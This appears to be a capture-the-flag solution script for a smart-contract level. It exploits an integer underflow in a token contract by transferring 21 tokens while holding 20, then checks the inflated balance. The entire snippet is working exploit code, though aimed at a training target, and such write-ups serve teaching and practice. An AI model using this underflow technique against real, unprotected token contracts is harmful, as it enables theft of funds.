/*
Tools needed for this level:
- Console
*/

// Since the contract is not protected from overflow/underflow,
// we can execute the transfer() function and send one more token
// that the ones we own (20) to cause an underflow
await contract.transfer('any_address_apart_from_player', 21);

// Check player's balance after tx
(await contract.balanceOf(player)).toString();
